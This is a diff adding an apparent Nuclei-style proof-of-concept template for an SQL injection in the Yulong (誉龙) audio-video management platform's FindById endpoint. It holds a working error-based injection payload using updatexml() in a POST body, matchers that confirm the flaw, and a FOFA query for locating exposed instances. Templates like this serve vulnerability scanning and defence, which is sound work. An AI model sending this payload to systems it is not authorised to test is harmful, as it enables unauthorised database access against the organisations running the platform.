@@ -1,0 +1,33 @@
+id: poc-yaml-yulongdt-findbyid-sqli
+info:
+  name: 誉龙视音频综合管理平台 FindById SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 誉龙视音频综合管理平台
+    fofa: body="PView 视音频管理平台"
+
+variables:
+  t1: "{{rand_int(1000,10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "/index.php?r=RelMedia/FindById"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "id=1+and+updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "XPATH syntax error"
+          - "SQLSTATE"
+      - type: word
+        words:
+          - "{{substr(t2,0,31)}}"
